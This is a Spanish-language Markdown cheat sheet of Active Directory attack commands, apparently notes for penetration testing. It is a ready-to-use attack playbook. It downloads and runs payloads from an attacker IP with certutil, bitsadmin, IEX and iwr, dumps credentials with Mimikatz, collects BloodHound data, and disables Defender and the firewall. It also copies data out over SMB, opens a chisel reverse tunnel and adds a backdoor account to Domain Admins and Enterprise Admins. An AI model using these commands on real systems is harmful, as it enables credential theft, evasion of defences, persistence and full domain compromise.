# Comandos AD

Tags: #AD #Windows 

* [Tools-AD](https://github.com/Spartan-Cybersecurity/CPAD-Tools)

```powershell
# Buscar y reemplazar 192.168.49.123 por tu IP publica o hostname de Ngrok:

python3 -c 'import pty; pty.spawn("/bin/bash")'
echo "ssh-rsa AAAAB3NzaC1= root@kali" >> ~/.ssh/authorized_keys

certutil.exe -f -urlcache -split http://192.168.49.123/bypass.exe
bitsadmin /transfer myJob http://192.168.49.123/EjecutaEsto.exe C:\\Windows\\Tasks\\EjecutaEsto.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/PowerView.ps1');
certutil.exe -f -urlcache -split http://192.168.49.123/HeidiSQL.zip
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/PowerUpSQL.ps1');
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLServerLink -Instance localhost 
Invoke-SQLAudit -Instance localhost

IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
certutil.exe -f -urlcache -split http://192.168.49.123/mimikatz.exe
.\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit 

IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/adPEAS-Light.ps1'); Invoke-adPeas -Outputfile result-adpeas.txt
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/SharpHound.ps1'); 
Invoke-BloodHound -CollectionMethod All -Domain spartancybersec.corp -ZipFileName luna.zip


(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.123/PsExec64.exe', 'c:\Users\Public\PsExec64.exe')
(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.123/PetitPotato.exe', 'c:\Users\Public\PetitPotato.exe')

certutil.exe -f -urlcache -split http://192.168.49.123/SharpHound.exe
.\SharpHound.exe --CollectionMethods All --Domain spartancybersec.corp

Set-MpPreference -DisableIOAVProtection $true -Verbose
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Get-MpPreference | select DisableIOAVProtection, DisableRealtimeMonitoring
Set-NetFirewallProfile -name Domain,Private,Public -Enabled False -Verbose
netsh advfirewall set allprofiles state off

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

net use \\192.168.49.123\kali-share /u:kali kali
copy \\192.168.49.123\kali-share\BypassCLM-bin.exe .
copy 20230915084901_BloodHound.zip \\192.168.49.123\kali-share\

iwr -uri http://192.168.49.123/chisel.exe -o c:\windows\tasks\chisel.exe
c:\windows\tasks\chisel.exe client 192.168.49.123:9090 R:9050:socks

iwr -uri http://192.168.49.123/NimScan.exe -o c:\windows\tasks\NimScan.exe
c:\windows\tasks\NimScan.exe 

IEX (New-Object Net.WebClient).DownloadString('import-module https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/Invoke-Portscan.ps1');
Get-DomainComputer -Properties cn | select -first 8 | %{Invoke-Portscan -Hosts $_.cn -TopPorts 50 -Threads 4}

iwr -uri http://192.168.49.123/NimScan.exe -o c:\windows\tasks\NimScan.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/winPEAS.ps1');
iwr -uri http://192.168.49.123/winPEASany.exe -o c:\windows\tasks\winPEASany.exe
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/PowerUp.ps1')


net user sephiroth Pass123 /add /domain
net localgroup Administrators sephiroth /add /domain
net localgroup 'Remote Desktop Users' sephiroth /add /domain
net group 'Domain Admins' sephiroth /add
net group 'Enterprise Admins' sephiroth /add
```